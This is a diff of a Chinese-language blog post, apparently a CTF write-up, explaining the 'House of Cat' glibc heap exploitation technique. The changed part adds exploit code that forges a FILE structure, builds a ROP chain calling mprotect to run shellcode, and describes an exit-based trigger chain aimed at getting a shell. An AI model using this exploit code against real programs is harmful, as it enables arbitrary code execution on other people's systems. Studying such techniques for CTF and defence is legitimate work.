@@ -29,7 +29,7 @@
 <meta property="og:description" content="House Of CatHouse of emma 是 glibc-2.34 下常用的攻击手法之一，其利用条件只需任意写一个可控地址就可以控制程序执行流，攻击威力十分强大，但是需要攻击位于 TLS 的 _pointer_chk_guard，并且远程可能需要爆破 TLS 偏移 House of cat 使用了一种新的 IO 链，目前适用于任何版本（包括 glibc-2.35）   House Of">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-08-08T06:50:55.000Z">
-<meta property="article:modified_time" content="2022-08-10T07:10:53.076Z">
+<meta property="article:modified_time" content="2022-11-08T08:52:25.364Z">
 <meta property="article:author" content="yhellow">
 <meta property="article:tag" content="House Of Cat">
 <meta name="twitter:card" content="summary">
@@ -192,7 +192,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-08-10 15:10:53" itemprop="dateModified" datetime="2022-08-10T15:10:53+08:00">2022-08-10</time>
+                <time title="Modified: 2022-11-08 16:52:25" itemprop="dateModified" datetime="2022-11-08T16:52:25+08:00">2022-11-08</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -216,13 +216,13 @@
               <span class="post-meta-item-icon">
                 <i class="far fa-file-word"></i>
               </span>
-              <span>4.7k</span>
+              <span>5.2k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
-              <span>4 mins.</span>
+              <span>5 mins.</span>
             </span>
 
         </div>
@@ -254,7 +254,7 @@
 </ul>
 <h2 id="House-Of-Cat-利用姿势"><a href="#House-Of-Cat-利用姿势" class="headerlink" title="House Of Cat 利用姿势"></a>House Of Cat 利用姿势</h2><p>利用 largebin attack 劫持 <code>stderr</code> 控制为已知 heap 地址，伪造 FILE 结构体，然后使 top chunk 不足以申请从而调用 <code>sysmalloc</code></p>
 <p>其中在 <code>stderr</code> 中的 fake_IO_FILE 如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0xffff</span>)  <span class="comment"># rax1 </span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(heap_base+<span class="number">0xc18</span>-<span class="number">0x68</span>)  <span class="comment">#rdx</span></span><br><span class="line">fake_IO_FILE +=p64(setcontext+<span class="number">61</span>)  <span class="comment">#call addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x200</span>)  <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(heap_base+<span class="number">0xb30</span>)  <span class="comment">#rax1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+<span class="number">0x2160d0</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0xb30</span>+<span class="number">0x10</span>)  <span class="comment"># rax2</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_io_addr = heap_base + <span class="number">0x290</span></span><br><span class="line">shellcode_addr = heap_base + <span class="number">0x750</span></span><br><span class="line">payload_addr = heap_base + <span class="number">0x700</span></span><br><span class="line">flag_addr = heap_base+<span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line">payload =  p64(payload_addr+<span class="number">0x10</span>) + p64(ret)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(heap_base)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0x7000</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">7</span>)</span><br><span class="line">payload += p64(mprotect) + p64(shellcode_addr)</span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line">fake_IO_FILE =  p64(<span class="number">0</span>)         <span class="comment">#_flags=rdi</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE += p64(payload_addr-<span class="number">0xa0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE += p64(setcontext+<span class="number">61</span>)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(flag_addr)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps+<span class="number">0x30</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br></pre></td></tr></table></figure>
 <ul>
 <li>在 vtable 的检测中对具体位置的检测还是比较宽松的，这使得我们可以在一定的范围内对 vtable 表的起始位置进行偏移，使其我们可以通过偏移来调用在 vtable 表中的任意函数</li>
 <li>这里对 vtable 进行偏移，使其可以调用 <code>_IO_wfile_seekoff</code> 函数</li>
@@ -277,6 +277,11 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5620ac902b40</span>+<span class="number">0x18</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x5620ac902b58</span> —▸ <span class="number">0x7f6ef7d99a6d</span> (setcontext+<span class="number">61</span>) ◂— mov    rsp, qword ptr [rdx + <span class="number">0xa0</span>]</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x5620ac902b60</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">4</span> skipped</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x5620ac902b88</span> —▸ <span class="number">0x5620ac902200</span> ◂— <span class="number">0x200000001</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x5620ac902b90</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
 <ul>
 <li>最后利用 House Of Kiwi 中的方式 get shell</li>
+</ul>
+<p>House Of Cat 还有另一条调用链：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__GI_exit -&gt; __run_exit_handlers -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_wfile_seekoff</span><br></pre></td></tr></table></figure>
+<ul>
+<li>直接执行 <code>exit</code> 就可以触发，不用破坏堆结构</li>
 </ul>
 
     </div>
@@ -378,7 +383,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">184</span>
+          <span class="site-state-item-count">185</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -391,7 +396,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">116</span>
+        <span class="site-state-item-count">117</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -432,7 +437,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">36:25</span>
+    <span title="Reading time total">36:35</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
